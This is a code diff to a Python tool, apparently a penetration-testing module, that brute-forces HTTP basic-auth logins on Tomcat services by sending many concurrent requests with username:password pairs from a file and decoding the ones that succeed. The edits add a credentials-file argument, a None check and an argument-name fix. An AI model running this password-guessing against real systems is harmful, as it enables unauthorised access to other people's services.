@@ -22,7 +22,7 @@ def brutefore_passwords(ip, url, credentials):
         auth_requests.append(grequests.get(url, auth=(username, password)))
     results = grequests.map(auth_requests)
     for result in results:
-        if result.status_code == 200:
+        if result and result.status_code == 200:
             creds = result.request.headers['Authorization'].split(' ')[1]
             creds = base64.b64decode(creds).decode('utf-8')
             creds = creds.split(':')
@@ -35,13 +35,15 @@ def main():
         Checks the arguments to brutefore and spawns greenlets to perform the bruteforcing.
     """
     services = ServiceSearch()
-    arguments = services.argparser.parse_args()
+    argparse = services.argparser
+    argparse.add_argument('-f', '--file', type=str, help="File")
+    arguments = argparse.parse_args()
 
     if not arguments.file:
         print_error("Please provide a file with credentials seperated by ':'")
         sys.exit()
 
-    if arguments.port or arguments.search or arguments.tags or services.is_pipe:
+    if arguments.ports or arguments.search or arguments.tags or services.is_pipe:
         services = services.get_services()
     else:
         services = services.search(search="Tomcat", up=True, tags='!tomcat_brute')
